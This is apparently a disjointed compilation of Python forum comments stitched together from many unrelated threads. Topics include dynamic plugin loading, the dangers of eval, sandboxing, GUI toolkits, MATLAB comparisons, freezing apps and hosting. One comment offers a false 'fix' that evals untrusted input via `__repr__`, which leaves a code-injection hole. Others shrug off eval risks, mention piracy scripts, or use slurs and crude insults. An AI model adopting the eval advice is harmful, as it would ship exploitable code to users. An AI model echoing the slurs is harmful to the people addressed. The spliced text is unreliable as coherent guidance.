First, thank you got the reply; gives me a lot to think about. Honestly, I'm being ambitious. I want to be able to load new features as we develop them. It's a SaaS deal so I would like to drop in the file and bam, new tool via the web interface. I won't be maintaining this so I want future developers to write their code, drop it in the folder and my framework will do the rest. There is no user input when adding to the framework so I'm not too worried about making a stupid mistake; a hacker could exploit it and I'm very conscious of this during planning. Importlib seems like the right tool vs eval. You inspired me to ask myself, how often are these new tools bring written? Probably not often enough to require this feature...but it's so cool!!! I have some thinking to do...
I'm all for contributing to matplotlib even if it's just an example doc but isn't it a bit derivative of the numpy logo [example](https://matplotlib.org/devdocs/gallery/mplot3d/voxels_numpy_logo.html)? It's the same thing just with switching views and saving to an animation writer? (which I got from other doc examples [here](https://matplotlib.org/examples/mplot3d/rotate_axes3d_demo.html) and [here](https://matplotlib.org/examples/animation/moviewriter.html).)
Buy a rubber duck and have it on your desk. Consult your new friend as soon as you are tempted to ask a question to one of your peers. You'll be surprised how many answers it will help you figure out. After this conversation, if you still have no definitive answer, at least your remaining questions to a colleague will be much deeper, polished and specific, and others will appreciate this. You might even end up teaching a thing or two to your senior peers and they will respect you for it. But more importantly, you will practice and develop your critical thinking skills, which are essential for our profession.
That’s crazy talk. Celery is a queue+worker paradigm, it’s built to be distributed across machines. Why the heck would you use celery if you’re not distributed??? 
Good stuff. I need to read on this more to be honest. This is brand new to me and I'm very curious.
Datetime.timedelta converting microseconds into human friendly units w/ str.
&gt; Because JSON is (mostly) compatible with javascript Implying it's not always compatible?
This is a great one
The issue isn't the language. Building the same app in, say, C, would only be harder. 
tmux + vim + nerdtree = never have to touch the mouse
Derivative is fine for this kind of showcase example; in fact it's practically the point! Help people see how all these pieces fit together to do something cool. Also, the guy who suggested you open the PR is one of the maintainers..
http://timelessrepo.com/json-isnt-a-javascript-subset
JSON is [not a subset of JavaScript](http://timelessrepo.com/json-isnt-a-javascript-subset). In JSON, you can have unescaped characters in a string that in JavaScript are required to be escaped.
A simple fix to this would be number = get_input_from_the_internet_or_something().__repr__ eval('x = ' + number) The __repr__ gets the ‘real’ value of the input.
I work with geneticists, and they tend to write gawdawful perl/lua monstrosities and more often than not have an unnatural affinity for tab and comma separated data. For small data sets the built-in csv module is quite good for turning the muck into something usable in very short order. For partial genome assays of ~1m markers Pandas has been an incredible tool for processing the data sets, both in how quickly a large file can be loaded and made available to do actual work, and the tools available to make use of the data itself. Then there's requests and records for very quick and easy http and database access. Far easier than firing up Postman/Insomnia and much more intuitive than a curl command.
Creating a pipeline to validate and ETL a third party's genomic data to see if we can interpret outcomes for them. 
If you are using eval on something that is not user input, I think it is not too evil. Besides that I think importlib is good solution. Another one I thought of is to copy the file into your path and then import it. Something like this: shutil.copyfile(filename, 'dynamic_mod.py') import dynamic_mod 
Lets also remember that `yaml.load` is just as dangerous.
well, 3&gt;=2, ;-)
I'm not really surprised, just saddened.
ITS A TRAAAP!!1
Check out the import stackoverflow then :)
For a while, and possibly still, there was a way to build pypy to stub out OS-level calls to an external program to handle. In theory, this completely sandboxes the python code you run so it can't muck about in the filesystem, on the network, or do anything you don't want it to do except eat up CPU time. Using it was kind of annoying, though.
why do you say so?
I think using a list comprehension to filter a container is particularly elegant. E.g., "given a list of words, find all those that start with 'c'" becomes: `[w for w in words if w.startswith('c')]` 
Example?
For example, one of my friend had automated regular download movies and episodes from torrents using a python torrent client. Not legal, but highly effective !! 
Also wrote a movie download script, but with premium hosters, which means I still had to solve captcha pop-ups. However, this is legal in my country. 
Can you expand a little on PDF gendration? Or give a link or two?
Because (s)he's Mon Calamari, obviously.
Downside of that is that it can only handle simple constant expressions, it can't do variables or function calls.
There is no vulnerability here, just nonsense post people voting up, because they saw "eval" and "dangerous" words together.
Yes, everything is running on Microsoft servers so you don't need to install anything on you local machine.
Thanks. It does seem useful.
Does 6 have any range/xrange compatability features to get around these differences?
$10 000 for prototyping, might cost more for maintenance, hit me up.
Created bitcoin faucets bot, it was generating quite serious income. 
Would it be terribly difficult to set up a virtual machine that could allow for eval() to work? Currently, I have a Discord bot that can execute arbitrary Python code, but it's running on a Raspberry Pi. Could I do something similar without the pi? How much setup would that require? 
I wrote a bot that automatically downvotes posts like this.
What are the criteria that the bot considers before downvoting?
I like going with web guis. Lots of information on how to make pretty web pages, and creates a nice boundary between the functionality and the pretties. You can use something like flask and use web sockets or rest. Its not for everyone, you need to know (or get to learn) html/css/js but its cross platform, and those are pretty cool and useful things to know. It is more bloated so i wouldn't recommend it for a game engine, but for clicking buttons, moving sliders and displaying outputs its great. 
I don't know why the main post is a picture, but [this](https://github.com/Bitmessage/PyBitmessage/commit/3a8016d31f517775d226aa8b902480f4a3a148a9) is what it's referencing. 
There is a whole [Raymond Hettinger](https://twitter.com/raymondh?s=09) twitter of beautiful samples. He's a core developer, so he know things.
If you asked this question, say, 13 years ago there were lots of things that were incredibly fun and concise in Python that in other languages would require a lot more boilerplate or be completely unreadable (ahem... Perl). Since then, other languages advanced a lot. New significant languages appeared. In both cases it is readily apparent that many things were borrowed from Python. Today, Python's relative strengths are different. Python always had good builtin and third-party libraries, but lacked a good central repository Perl's CPAN had a definite edge over Python in the 2000s. PyPI has since caught up. The data science ecosystem has exploded. Today, what makes a task particularly elegant is being able to pip install the libraries that do what you want, along with their extensive dependencies inside an isolated virtualenv - and then import it, write a couple of lines of glue code and execute a complex task that sometimes builds on dozens of person-years of work.
My opinions.
ha ha. then you have no such bots.. do you?
Alternatively if you have a massive number of potentially large objects to process use a generator expression so lazy evaluation is used.
https://github.com/pallets/flask/blob/master/Makefile but what would armin know, right
The downside of `eval()` is that you can call *all* functions and that Python doesn't give you any tools to isolate the main interpreter from the code executed in `eval()`. With proper scripting languages (e.g. Javascript, Lua, Tcl, ...) you can just spawn a new interpreter and evaluate all the code in a safe environment that doesn't allow it to do anything evil.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [pallets/flask/.../**Makefile** (master → 79f34f1)](https://github.com/pallets/flask/blob/79f34f1769477d9909e4fe0830c48b04208c50fc/Makefile) ---- 
Not as bad as not knowing sarcasm, I guess.
Extending on the iterators side if you're not using the [itertools module](https://docs.python.org/3/library/itertools.html) or it's child [more-itertools](http://more-itertools.readthedocs.io/en/latest/) you're almost certainly missing out.
The problem isn't the users, but that the languages provide inadequate tools to do things in a safe manner.
[Sqlite3](https://docs.python.org/3/library/sqlite3.html), quoting the first paragraph from the link *SQLite is a C library that provides a lightweight disk-based database that doesn’t require a separate server process and allows accessing the database using a nonstandard variant of the SQL query language. Some applications can use SQLite for internal data storage. It’s also possible to prototype an application using SQLite and then port the code to a larger database such as PostgreSQL or Oracle.*.
It does, for most cases ... just use **eval** or **exec** with a constrained namespace. By default they're dangerous as all Hell, but limit the *globals* and *locals* your string can possibly have access to and you can button it down quite easily... people just don't. That said, dynamic code generation that doesn't work in a similar manner to **collections.namedtuple** is usually the wrong answer anyway.
How about your academics take their pick from this lot [10 Useful Python Data Visualization Libraries for Any Discipline](https://blog.modeanalytics.com/python-data-visualization-libraries/)? They can skip the first if they like as it's matplotlib :-)
It takes special kind of stupid...
User input might be a good one. Also, python is great with string manipulation, maybe show them the elegant way to reverse a string "myStr[::-1]", how to get the last character from a string "myStr[-1]", etc.
Sure. But a) getting from that to an import and arbitrary execution isn't trivial, and b) you've severely narrowed the footprint and checks to make on the incoming string to sanitize it. But, as I said above, dynamic code creation is very rarely a good idea, and, when needed, do what namedtuple does, an exec of a template that doesn't actually result in evaluation of any user controlled strings.
The library is now renamed to SeqTools because it is give much more intuition about what it does, sorry for the inconvenience. You may now find the code and docs at https://github.com/nlgranger/SeqTools and http://seqtools-doc.readthedocs.io respectively.
Hmm. Life must be hard for you to so proactively vent out against strangers. May I suggest r/depression 
The hardware or the system it's running on aren't the issue. The issue with eval is that the code you eval can do anything your code can, including accessing private variables in your program and executing arbitrary commands on your system. If you're feeling dangerous, you could probably do something like: 1. wrap the user-input string in a print() call (or not, it depends whether you want people to have to do that themselves) 2. write the string out to a temporary file 3. execute the file in using the subprocess module, preferably in some kind of sandbox like a Docker container. Even then to be as safe as possible you would probably want to use one container per submission, and at that point it's probably going to give you a lot more trouble than it's worth.
What would it need? Anything that was legal and correct code in 2 will work the same in 3, except, I think, `xrange.__reduce__`, which supports a function that is no longer part of the language at all. Anything that uses the features described of 3 won't ever be legal or correct code in 2... so what sort of comparability layer would be needed?
&gt; But a) getting from that to an import and arbitrary execution isn't trivial Security by "Let's hope nobody is bored enough to exploit it" isn't exactly a good strategy. &gt; But, as I said above, dynamic code creation is very rarely a good idea There is nothing wrong with dynamic code creation. Every larger piece of customizable software will have it in one form or another, be it something simple like style sheets or a full blown scripting language. It just would be nice if Python could handle that kind of task without exposing the main interpreter, but since Python relies so much on global state (on the C API side of things) that's probably not getting fixed anytime soon. 
That is cool. I mainly use datalab on GCP which I have free through work but this looks nice. One thing you could try is that usually in a notebook you can run bash commands with a ! So instead of pip.main(['install', 'pandas', '--upgrade']) try !pip install pandas --upgrade I'm glad you pointed out display.clear_output(), I needed that, thanks
Qt is great, but I find that the code for GTK is a lot cleaner. Just check this shit out: https://python-gtk-3-tutorial.readthedocs.io/en/latest/basics.html
&gt;vent out You mean, respond sarcastically and be taken seriously by a typical moron on internet? :(
"don't run eval from an untrusted source" hey thanks you dumbass
ReadTheDocs itself [is open source](https://github.com/rtfd/readthedocs.org) - just deploy an instance.
u still in r/python.. do to r/depression now.. not too late to save urself.. 
Nice try, cops. 
&gt; Security by "Let's hope nobody is bored enough to exploit it" isn't exactly a good strategy. The non-triviality of it makes it easy to sanitize out. An attacker who isn't lazy here has to use an access pattern that is quite obviously a fingerprint of bad action... but the actual strategy at work here is to rely on the developer of the code using **eval** to not be lazy or stupid, and try as hard as possible to warn them away from doing it in the first place. And yes, lots of large projects use dynamic code... most don't do it from a raw string the user has complete control over. Anyone using namedtuple is using dynamic code, they're just using it in a well-constrained fashion, and the majority of plugin systems I've seen could have been structured in much the same manner, but for the laziness of the programmers. Now, embed a full scripting language interpreter in your app, and you've got an entirely other set of problems... but you also shouldn't bloody well be doing that by just running eval on a multi line input either. At the end of the day Python provides quite a large number of tools to facilitate what is inherently a dangerous operation in a closer-to-safe fashion. By combining several of those tools you can get most common patterns of dynamic generation down to something pretty much as safe as need be for the narrow task at hand. Yes, there's a complexity to doing that, and the less sandboxed you expect your user's arbitrary code to be the closer to impossible to ensure safety becomes, but please name a language that doesn't expose the dangers of arbitrary code execution when evaluating arbitrary code. If there is one, move all the dynamics to that.
Lots of programming exercises we used to do in C become kind of pointless in Python. "Write a function to count the number of unique items in a list" `len(set(L))`. 
Okay. Well I'm currently only supporting windows 7-10. The version I can't recall by heart. I'm not near my computer right now. Hope that provides some clarity.
Pretty sure that using eval in any of those languages is still a really bad idea and because of code injection problems
It's very easy with http requests. 
I swear I tried that and it didn’t work, so I had thought they disabled that, but I just checked and it does work. Thanks! At least the pip.main might be nice if you needed to iterate through a bunch of dependencies.
&gt; It just would be nice if Python could handle that kind of task without exposing the main interpreter It doesn't really matter, though, code injection is code injection... javascript spins up another interpreter and XSS is still very exploitable.
Yes, it makes it really easy to teach complete noobs how to get started in Python super quickly.
&gt; If eval is so insecure, it's shocking that a function like that isn't in the standard library. lol input() does the same thing and it's, like, made for user input. It's just not designed with security in mind, plain and simple.
Yeah it's remarkably dumb. I always wonder if they had a discussion about it before they implemented it and made a conscious decision to directly eval an argument to a function that is given to beginning programmers as an example of how to get user input, or if the individual that wrote that function was just an idiot.
Ok, so a bit of research says on Windows you set the wallpaper using **ctypes.windll.user32.SystemParametersInfoA** if **path** is *bytes* (the usual for Python2) and **ctypes.windll.user32.SystemParametersInfoW** if **path** is *unicode* (the usual for Python3. The **path** by the way is the absolute path to the file you want to set the backdrop to, *not* the path to the current wallpaper. So this should work: import ctypes ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3) But I'm not on a Windows system to check.
I honestly wouldn't even trust docker. I'd do a VM per submission.
The point is that you don't need to use a brute-force `eval()` with access to the main interpreter in those languages. To spawn a new Lua interpreter you do this: int error; lua_State *L = lua_open(); /* opens Lua */ luaopen_base(L); /* opens the basic library */ luaopen_table(L); /* opens the table library */ luaopen_io(L); /* opens the I/O library */ luaopen_string(L); /* opens the string lib. */ luaopen_math(L); /* opens the math lib. */ All the libraries that should be available in the interpreter need to be explicitly registered. If you don't want the user to have access to them, just don't make them available. If different scripts need to be run with different libraries, you just spawn another Lua interpreter in your program. By comparison, this is how you spawn a Python interpreter: Py_Initialize() Lots of module initialisation happens more or less automatically behind the scene and the interpreter is global state, there can only ever be one of it in a given process. Which makes Python kind of annoying as extension language and impossible to secure properly. The issue isn't `eval()`, but that you can `eval()` inside another interpreter that is isolated from the main one.
&gt; Anything that was legal and correct code in 2 will work the same in 3, except, I think, xrange.__reduce__, which supports a function that is no longer part of the language at all. I think you're confused although I can well understand why :-) The built-in `reduce` function was moved to the `functools` module but `__reduce__` remains throughout as it's part of the pickle protocol
Hello. I studied it but I don't want to build. Each project already produce their own static pages (and I plan to be able to index non python project documentation as well, as long as they produce HTML).
Hmm, you are correct... it being missing from the dir() for **range** above and a misreading of some docs long ago seems to have misled me.
"safe" is another word for "limited". Executing code is literally what computers are for and shouldn't be disabled. What's needed is better education and maybe some kind of software engineering best practices/certification program, plus accountability for those that use *potentially* unsafe tools in a genuinely unsafe way.
[Wxpython](https://www.wxpython.org/) is an option. It's well supported having very active user and development mailing lists. It's actually a wrapper around [wxWidgets](https://www.wxwidgets.org/) which means that it *gives applications a truly native look and feel because it uses the platform's native API rather than emulating the GUI*.
I've read this about pandas syntax a lot and don't get it. I used R for almost a decade before python and pandas and much prefer the latter over Rs data.frames.
Thanks! I used this [repo](https://github.com/Dvlv/Tkinter-By-Example) to learn the basics. From there I googled when I needed to know more about a certain UI control. The best results were effbot, tutorials point and StackOverflow.
Just a comment, ugly code is independent of which modern language you're using. If a person is writing ugly Matlab code, they're going to write ugly Python code. Writing elegant, well-structured code is an effort/dedication issue. Let me demonstrate by comparing against a few of the Python examples in this thread. From /u/foreverwintr &gt; think using a list comprehension to filter a container is particularly elegant. E.g., "given a list of words, find all those that start with 'c'" becomes: [w for w in words if w.startswith('c')] In Matlab this would be: w = words(startsWith(words,'c')) From /u/sunjaun2 &gt; Also, python is great with string manipulation, maybe show them the elegant way to reverse a string "myStr[::-1]", how to get the last character from a string "myStr[-1]" In Matlab myStr{1}(end:-1:1) myStr{1}(end) From /u/ToyoMojito &gt; Creating csv-files with nothing more than a loop and a print function. In Matlab you could do the same: A = rand(100,5); f = fopen('myFile.csv','w+') for ii = 1:size(A,1) fprintf(f,
Indeed, I mostly use them for speeding up web scraping tasks.
The thing which gets you instabanned the moment you use it anywhere? Who cares.
Thanks!
Thanks! It depends mostly on your personal preferences. Learning Flask will lead to learning some HTML, CSS and JavaScript and that can take a lot of time. But the payoff is good since you can always deploy your projects on a web server. If you want to make a quick prototype or a simple GUI app then Tkinter, PyQt, Kivy, etc, are just fine.
Just a comment, ugly code is independent of which modern language you're using. If a person is writing ugly Matlab code, they're going to write ugly Python code. Writing elegant, well-structured code is an effort/dedication issue. Let me demonstrate by comparing against a few of the Python examples in this thread. From /u/foreverwintr &gt; think using a list comprehension to filter a container is particularly elegant. E.g., "given a list of words, find all those that start with 'c'" becomes: [w for w in words if w.startswith('c')] In Matlab this would be: w = words(startsWith(words,'c')) From /u/sunjaun2 &gt; Also, python is great with string manipulation, maybe show them the elegant way to reverse a string "myStr[::-1]", how to get the last character from a string "myStr[-1]" In Matlab myStr{1}(end:-1:1) myStr{1}(end) From /u/ToyoMojito &gt; Creating csv-files with nothing more than a loop and a print function. In Matlab you could do the same, or more compactly: A = rand(100,5); A = table(A); writetable(A,'myFile.csv') From /u/jmmcd &gt; "Write a function to count the number of unique items in a list" len(set(L)) Similarly in Matlab length(unique(L)) My point is just this, if you think the "ugly code" problem is just because the researchers are using Matlab and that "if they just switch to Python they're going to start writing elegant code", then you're going to be disappointed. 
Sure, more tools should be available. But we shouldn't "replace `eval()`". We should supplement it.
I guess you mock the server.
I looked through one of his talks for inspiration, but didn't think to check his twitter! Good idea, thanks
Haven't heard of Leather of Gleam, will take a look, thanks 
Just a personal preference I think. I have found I really like R for some tasks after introducing elements from the tidyverse into my tasks (specifically dplyr). I do think vanilla R is more confusing than pandas.
Of course there is vulnerablity. If you have write access you can make cls/clear executable and that code will run it. I don't trust your software anymore.
I definitely agree with this. I suppose I'm considering the simplicity of from sklearn import linear_model model = linear_model.LinearRegression() model.fit(training_data, testing_data) to be a form of elegance, even if that's not really the canonical definition. 
"Doesn't work for some reason, netter try with sudo, seems to tix most things."
This is basically why I found learning C after years of python to be pretty painful (or perhaps everyone finds C to be a bit painful). Set operations are very clean though, I'll probably include that. 
Look at this server. 2 cores only. Can you believe that? Gayyyy
Yes, and dicts. 
Make a bot that's tests the bot
http://pyfpdf.readthedocs.io/en/latest/index.html https://www.reportlab.com/opensource/
The point is that you DO NOT NEED EVAL in this example and this code STILL ALLOWS TO EXECUTE cls/clear executable. Thus, it is not the eval that is dangerous in this specific example. Eval is dangerous, but this post and its example is confusing and there are 100 ways to better present dangers of eval. On the side note, if you have write access on Windows you can already do lots of other dangerous things :)
Wow! It's like I've traveled back in time!
I do get your point, but my belief is that it is easier to write beautiful code in python. And if I can sell them on the benefits of writing elegant code, and it's not that difficult they just might start to think about doing that. I guess that is a personal belief but I do think it's true. And to be fair, a lot of tasks get much harder in matlab once a bit of complexity is introduced. For example, last night after this post I actually converted a bunch of mat files into csvs. It ended up looking something like this: files = dir('*.mat') files = {files(:).name} for i=1:numel(files) load(files{i}) fid = fopen([num2str(i) '.csv'], 'w') fprintf(fid, 'v1,v2,v3\n') for j=1:numel(numLines) fprintf(fid, '%i,%i,%s\n',... v1, mystruct.v2(j), v3{j, mystruct.v2(j)}) end fclose(fid) end I *think* this is basically the best way to do this sort of thing in matlab. Personally, I think even the same sorts of operations become cleaner in python: import glob files = glob.glob('*.mat') and for myfile in files: with open(myfile[:-3] + 'csv', 'w'): f.write('v1,v2,v3\n') for i, line in enumerate(data): f.write('{},{},{}'.format(v1, v2[i]), v3[v2[i]]) I'm not even really trying to write nice python code there and I still think it turns out better than matlab. 
Okay, go and use it in any big server, we'll see how long it takes.
You don't need it with SQAlchemy and Alembic
You don't get banned for being reported because they don't give a shit unless you spam API. Retards who run servers on the other hand...
Try using NetworkX: https://networkx.github.io/
Full disclosure: I happen to be the developer. I am mainly putting this out there to get feedback and possibly PRs. This is a pretty new project and while I do use it myself for "real work", I am not necessarily declaring that others should right away. But I do think it has potential and I certainly want comments and advice and PRs etc.
That’s cute, I haven’t seen that before
https://heroku.com
Do i pay 7$ per month for each app there ? Or i can pack multiple apps there?
With [shittydb](https://github.com/rickystewart/shittydb) it is.
You pay per dyno, which gives you a set amount of processing power and RAM.
Emacs + jedi + projectile 
Getting your environment setup is lesson number 1. 
Thanks, but heroku isnt for me then :)
Yes i totally understand that but its just not a case in my scenario.
No problem!
just use ```pip install -r requirements.txt```
Have been using pipenv lately, I’ll never go back to using plain pip again
Can you setup a virtual environment and activate it from within a live jupyter notebook?
true, that should work too
I forget to mention i dont mind learning something new, but please let it be nice with a GUI hehe :) Right now i found http://traefik.io heres a nice tutorial i am following https://www.digitalocean.com/community/tutorials/how-to-use-traefik-as-a-reverse-proxy-for-docker-containers-on-ubuntu-16-04
I use [Gunicorn](http://gunicorn.org) for running python in production. It also required a bit of nginx configuration but it's 99% copy-and-pasteable from their tutorial. 
I think this does exist, i just checked. but a six.compat.range would act just like python3s range in python2 and 3. that may be tricky, because for some reason i don't think you can inherit from python3s range. 
" Eve is powered by Flask " so you might aswell just Flask
[Errno 13] Permission denied: '/usr/local/share/jupyter/kernels/python3'
Hi kankyo, I’m the author of the migration guide. Thanks to breamoreboy for posting it. I noticed all the hits from reddit in my Web stats and came by to see where they were coming from. I’m curious about your comment. I’ve used six and it’s a great library. However, I don’t understand how six would be helpful for a project that has no interest in simultaneous Python 2/3 compatibility. What I hoped to get across in my guide was that it’s possible to stay in Python 2 (specifically 2.7) while massaging the code towards 3.x syntax and doing other work to prep for the migration. When that’s been taken as far as possible, the jump from 2 to 3 should be relatively short. It seems to me that if an organization adds the six library to that scenario, at some point they still have to cut over from Python 2 to 3, but afterwards they have the additional chore of ripping out six and replacing it with non-sixified code which is extra work and an opportunity to introduce bugs. I assume you had something different in mind, or a different perspective on the cost/benefit. Care to elaborate? If there’s different or better routes to Python 3, I’m interested. Cheers!
Or they just spun up a VM for this video and gave it 2 cores. You should try not being an asshole.
I use pyenv myself for entirely isolated environments.
We have just finished ripping out six at work. 240kloc code base. That part is really trivial. There was one case with a tricky meta class but that was it. It’s done by one person not in a week easy. Compared to the 1.5 years to go to Python 3 it’s a rounding error. We switched back and forth many times before it actually worked in 3. You can’t do that without something like six. My blog post on our transition is in the making, just want feedback from a few more colleagues :P
Aha now i don't even need clear_output! 
Interesting, didn't know Armin was behind it. I do like how pyenv can auto switch me into a different virtualenv based on a dot file in current directory. Looks like with pipenv I'll still have to type something to switch env
Yeah, but OP was asking about Tkinter, so pretty may not be priority #1
Parse output of another program and put the data in an sqlite database for easier analysis. Its straight forward, simple and powerful.
&gt; input() does the same thing in python2 and it's, like, made for user input. It's just not designed with security in mind, plain and simple No it's not and you shouldn't use input in Python 2. Ideally you use something like `float(raw_input(user_stuff))`. You should ask yourself when you're using eval if you really want to use it. It certainly has it's places though. For example, if the user can define a custom function, that takes in arguments x and y and returns z, a logical way to load the function is using import. They now have total control of your program if they really want. The alternative is using an ast parser and restricting things like files and exceptions, which at that point is stupid if you're giving the user scripting/the ability to add functions. If you're just loading some int/float/string/dictionary/list data, then an ast parser is the right way to go. If they signed an NDA, it's not a huge issue. You can download the source of many commercial programs (only really the people making plugins would) if you have an NDA. If it's a web-based program, especially if I'm selling something, then no, I'd never use eval. If it's a desktop application, mehh...go ahead and delete all the files on C; you had the permissions anyways. What happened to the "we're all adults" philosophy of Python. Some ast validators restrict people from using `while 1:` because it could potentially result in an infinite loop. That's not my problem; just restart the desktop application. Again, never on a web-based program.
Did you get what you needed?
Yeah, that auto switch feature with pyenv is cool. I was expecting it to automagically kick me into the venv when I cd' into the folder the first time. Felt like Scotty in that Star Trek movie where he's grabbing the mouse from the table top holding a 20th century computer and saying 'computer?' into it. Nothing happens...
oh. yeah I'm and idiot. -_-
Be even nicer with f-strings
This is awesome because i do machine learning and my computer lacks the power to do super advanced calculations with large datasets in a reasonable amount of time. This will put the work load on Microsoft's servers 😛
Aren’t they annoying with new lines though?
Not in my experience. What have you seen?
She's an organizer, and she's talking about how to organize an open source project - how to work with sponsors, how to attract and retain contributors, not how to write code.
 import ctypes import os import random SPI_SETDESKWALLPAPER = 0x14 if __name__ == '__main__': # find folder cwd = os.path.dirname(os.path.realpath(__file__)) image_folder = os.path.join(cwd, "images") # pick image images = os.listdir(image_folder) image = random.choice(images) image_full = os.path.join(image_folder, image) # set wallpaper ctypes.windll.user32.SystemParametersInfoW( SPI_SETDESKWALLPAPER, 0, image_full, 0) 
If you're a student you get free license for the professional edition.
Holy shit I've seen this question come up so many times and all the other solutions are crappy. This is so smart.
Correct. Nothing is duplicated.
Iterating over a group of things. Such a common operation, and beautifully expressed with, eg, list comprehensions.
Article is good, thanks. I like Pyinstaller and I didn’t know that it support Python3 now. I tried using cx_Freeze, but I unlike it.
Neat stuff. Crypto is fascinating!
Dokku - https://github.com/dokku/dokku Digital Ocean - a droplet size of your choosing. I recommend 10$/m or more. Using dokku you can deploy as many apps as you want.
I like this one cause I found it in the official Python documentation, but I forgot where exactly.
Who would have of thought.
Thanks for sharing your experience from the trenches. 1.5 years sounds like a long time, even for 240kloc. Were you starting from Python 2.7, or an older version? I hope you'll post a link to your blog here when the case study is ready; I'd like to read it. I recently worked on a project of ~70k LOC and I did most of the Python 2-to-3 code prep myself in a few months working part-time. Granted, I left before the move to 3 happened so it wasn't a full beginning-to-end test. The other devs and I felt pretty comfortable with the process. It happened in fits and starts (maybe that was your experience too) because occasionally we'd come across a library upgrade forced by the 2-to-3 prep that would affect a bit of code that needed refactoring anyway, and so 2-to-3 migration would pause while refactoring happened, that sort of thing. In any case, congratulations on completing the journey! 
You’re being downvoted because `pyenv` isn’t a dependency manager, it manages versions of Python.
Backslashes can’t go in expressions, which is kind of annoying. Here it doesn’t matter so I could use them.
How is this different from Google colaboratory?
Small correction to the README. It’s called a virtual environment, `mkvirtualenv` is just a command that comes from the `virtualenvwrapper` package. Other than that I really like the name and the idea 👍
Yes, thankfully that's a rare situation (I've never personally needed it). 
Why does the OWASP example show a static string eval as problematic then?
Which includes pip, and everything relating to pip. Stand up a version, and use a requirements.txt. Job done.
Nothing to do with python, that's just the problem floating point numbers have.
notepad.exe
fixed, thanks!
This will definitely be a desktop-based, downloadable, .exe-type app. Would a web GUI be useful for non-web-based programs?
r/learnpython Also, write your code, don't take a screenshot, especially if you're going to blur out your name ESPECIALLY (again) if you're also covering what seems to be part of the code itself, considering the indents.
I can't replicate what you see there in a standard python install. I'm guessing the reason its doing that is just because that web interface doesn't flush the output correctly after you input it. If you have python actually installed on your local box, then copy that to a file and run it with python and make sure. Couple of things to help make your code better: * https://docs.python.org/3/library/stdtypes.html#str.capitalize * https://stackoverflow.com/questions/9757277/python-string-slice-indices-slice-to-end-of-string * https://www.tutorialspoint.com/python/python_strings.htm (look at "String Formatting Operator")
For the record, here's the Matlab code I would have written for your specific case: files = dir('*.mat'); for ii = 1:length(files) load(files(ii).name) [~,filename,~] = fileparts(files(ii).name); writetable(struct2table(mystruct), [filename '.csv']) end
&gt; If you're a student And all this requires is that you have a .edu email address.
It looks really interesting i am diving into it :) So are you saying setting up custom domains and free SSL should be really simple on it?
You're welcome. I'm glad you enjoyed it! :)
So dokku has "app" functionality built in. So you push each "app" to the server. From dokku you can add domains to each app. Digital ocean actually has a preconfigured dokku droplet that you can use. All you need to do at that point is set the app up on the server and configure it to fit your needs. If you want free ssl, there is a let's encrypt plugin that exposes commands to add ssl to your specified app. I can completely deploy a new ssl app in under 10 minutes. Once it's setup you just push your code to the server and it should just work.
Actually looks like it's pretty similar. I think google colaboratory previously only had python 2, so I wrote it off, but it looks like it has Python3 now. Thanks!
Nice guide. Freezing has been one of the biggest pains in the ass with Python apps. I'll give this a shot!
Ok thank you it looks amazing :)
? For eval command you check whether owner issued a command, and this has nothing to do with checking whether owner issued a command.
Sorry I misinterpreted the question asked
Which hardly anyone outside the US has. Which is odd, since jetbrains is s czech company, they should know better.
It appears I was incorrect! https://github.com/JetBrains/swot/tree/master/lib/domains They actually have a rather large list of domains that are acceptable.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [JetBrains/swot/.../**domains** (master → d931749)](https://github.com/JetBrains/swot/tree/d931749b72774e66a3851c0c39cc23993c8cfb7b/lib/domains) ---- 
Colab definitely uses Jupyter notebooks under the hood, it has it's own skin on top, and offers some other features (like collaboration between multiple users) but you can download your colab file and import it into your own notebook server. I too initially wrote it off as it was only Python 2, no idea when they added Python 3.6 support
Article teaches how to freeze, doesn't define wtf "freeze" is supposed to mean. From context, seems to be some way to turn your app into a single executable?
Getting people into the community is not the same as making an open source project successful. 
Respek 
No.
We normally call this "packaging". Is this "freezing" term new? It seems like a strange thing to say. Good article though.
Joined datacamp, it's awesome, and on free time working on numerical algorithms!
This is not just packaging. This is generating dependency free binaries for multiple platforms.
I always assumed that freezing meant including all the dependencies, including python for standalone end user use and that packaging does not necessarily mean that all the dependencies will be included. For example shared dynamic libs. 
I found this nice conversation https://news.ycombinator.com/item?id=14531883
Did you ever try Flynn in comparison ?
How about declaring the scripts with setuptools, which should automatically give a shebang for the python executable that it is installed under? Admittedly I have no experience writing packages for different distros, so I don't really know how well that would work with system package management, but it seems reasonable to me.
Seems her github is solely for the website. She likely doesn't use it as a portfolio, like many others.
delet dis
Poland here, got edu mail when was studying 
Check out [asteval](https://newville.github.io/asteval/), it's NOT exploit-proof but it's much safter than regular eval for such an application. I use it along with [stopit](https://pypi.python.org/pypi/stopit/1.1.2) (asteval has a timeout built in but it's inadequate and deprecated) in my telegram bot.
I think I switched to Python when plyr was new and tidycerse was not a thing
Holy FUCK this is so bad I think I'm going to have an aneurysm. The library provides a command-declaration syntax with decorators so that you can define each command as its own function without having to bunch all your shit in a single on_message event.
Yes, I mention that at the end. And that is coming in part two that is almost done. This is supposed to be a simple intro, and it uses the official example, so if you really don't like it, maybe you can submit a pull request to improve the official examples.
Bad bot
Eat a bag of human dicks. &gt;:( *** ^^^I'm&amp;#32;a&amp;#32;Bot&amp;#32;*bleep*&amp;#32;*bloop*&amp;#32;|&amp;#32;[&amp;#32;**Block**&amp;#32;**me**](https://np.reddit.com/message/compose?to=friendly-bot&amp;subject=stop&amp;message=If%20you%20would%20like%20to%20stop%20seeing%20this%20bot%27s%20comments%2C%20send%20this%20private%20message%20with%20the%20subject%20%27stop%27.%20)&amp;#32;|&amp;#32;[**T҉he̛&amp;#32;L̨is̕t**](https://np.reddit.com/r/friendlybot/wiki/index)&amp;#32;|&amp;#32;[❤️](https://np.reddit.com/r/friendlybot/comments/7hrupo/suggestions)
